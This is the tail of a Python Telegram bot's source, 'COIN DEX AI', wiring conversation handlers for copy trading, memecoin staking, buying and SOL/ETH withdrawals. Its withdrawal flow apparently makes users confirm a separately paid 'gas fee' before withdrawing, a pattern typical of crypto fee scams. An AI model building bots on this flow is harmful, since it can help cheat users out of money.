    fallbacks=[CommandHandler('cancel', lambda u, c: u.message.reply_text("Cancelled", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Menu", callback_data='back_menu')]])))]
)

# Staking conversation
stake_conv = ConversationHandler(
    entry_points=[
        CallbackQueryHandler(stake_memecoin_start, pattern='^stake_meme$'),
    ],
    states={
        ENTER_CONTRACT_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_contract_address)],
    },
    fallbacks=[CommandHandler('cancel', lambda u, c: u.message.reply_text("Cancelled", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Menu", callback_data='back_menu')]])))]
)

# Buy/Stake amount conversation
buy_stake_conv = ConversationHandler(
    entry_points=[
        CallbackQueryHandler(buy_token_start, pattern='^buy_token_'),
        CallbackQueryHandler(stake_token_start, pattern='^stake_token_'),
    ],
    states={
        ENTER_STAKE_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_token_amount)],
    },
    fallbacks=[CommandHandler('cancel', lambda u, c: u.message.reply_text("Cancelled", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Menu", callback_data='back_menu')]])))]
)

# Withdrawal conversation
withdraw_conv = ConversationHandler(
    entry_points=[
        CallbackQueryHandler(start_withdrawal, pattern='^withdraw_(SOL|ETH)$'),
    ],
    states={
        ENTER_WITHDRAWAL_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdrawal_amount)],
        ENTER_WITHDRAWAL_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdrawal_address)],
        CONFIRM_GAS_FEE: [CallbackQueryHandler(confirm_gas_fee_paid, pattern='^confirm_gas_paid$')],
    },
    fallbacks=[CommandHandler('cancel', lambda u, c: u.message.reply_text("Cancelled", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Menu", callback_data='back_menu')]])))]
)


# ============ START BOT ============

if __name__ == '__main__':
    print("🚀 COIN DEX AI Bot is starting...")
    
    application = Application.builder().token(config.BOT_TOKEN).build()
    
    # 1. Command handlers
    application.add_handler(CommandHandler('start', start))
    
    # 2. Conversation handlers (MUST be before general callback handler)
    application.add_handler(copy_trade_conv)
    application.add_handler(stake_conv)
    application.add_handler(buy_stake_conv)
    application.add_handler(withdraw_conv)
    
    # 3. General callback handler LAST
    application.add_handler(CallbackQueryHandler(button_handler))
    
    print("✅ COIN DEX AI is running!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)
